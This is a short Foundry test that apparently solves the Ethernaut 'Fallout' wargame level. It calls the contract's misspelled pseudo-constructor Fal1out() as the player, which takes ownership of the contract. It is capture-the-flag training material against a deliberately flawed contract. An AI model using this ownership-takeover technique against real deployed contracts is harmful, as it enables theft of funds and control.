pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/FalloutFactory.sol';
import 'levels/Fallout.sol';
import 'utils/TestUtils.sol';

contract FalloutTest is Test {
  address player;
  Utils utils;
  FalloutFactory falloutFactory;
  address payable falloutAddress;
  Fallout fallout;

  function setUp() public {
    utils = new Utils();
    player = utils.createUsers(1)[0];
    falloutFactory = new FalloutFactory();
    falloutAddress = payable(falloutFactory.createInstance(player));
    fallout = Fallout(falloutAddress);
  }

  function testHack() public {
    vm.prank(player);
    fallout.Fal1out();

    falloutFactory.validateInstance(falloutAddress, player);
  }
}
